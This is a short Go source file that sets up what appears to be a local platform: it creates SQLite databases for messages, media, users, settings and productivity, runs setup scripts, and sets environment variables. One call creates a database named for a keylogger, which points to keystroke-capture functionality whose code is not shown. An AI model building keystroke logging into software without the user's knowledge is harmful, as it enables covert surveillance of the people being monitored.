package main

import (
	"log"
	"os"
)

// setup runs scripts to setup environment variables
func setup() {
	err := dbInit()
	if err != nil {
		log.Printf("Error initializing database: %v", err)
	}
	MigrationAssist()
}

// MigrationAssist Injects All required platform environment variables to environment in use for easy retrieval
func MigrationAssist() {
	//Execute Shell Script
	SetupScripts()
	setUpPlatformEnvVars()
}

// dbInit Creates Required SQLite DBs for platform to function
func dbInit() any {
	extendBase := extensionsSource()
	if extendBase != nil {
		log.Println(extendBase)
	}
	masterBase := createMasterMessages()
	if masterBase != nil {
		log.Println(masterBase)
	}
	err := createGalleryDatabase()
	if err != nil {
		log.Println(err)
	}
	errs := createMessagesDatabase()
	if errs != nil {
		log.Println(errs)
	}
	userBase := createUserDatabase()
	if userBase != nil {
		log.Println(userBase)
	}
	settingsBase := createSettingsDatabase()
	if settingsBase != nil {
		log.Println(settingsBase)
	}
	mediaBase := createLocalMediaDatabase()
	if mediaBase != nil {
		log.Println(mediaBase)
	}
	activityBase := createProductivityDatabase()
	if activityBase != nil {
		log.Println(activityBase)
	}
	majorKeys := createKeyloggerDatabase()
	if majorKeys != nil {
		log.Printf("Error creating database: %v", majorKeys)
	}
	return nil
}

func SetEnvironmentVariable(key string, tokenValue string) {
	valueToStore := os.Setenv(key, tokenValue)
	if valueToStore != nil {
		log.Printf("Error setting environment variable: %v", valueToStore)
	}
}
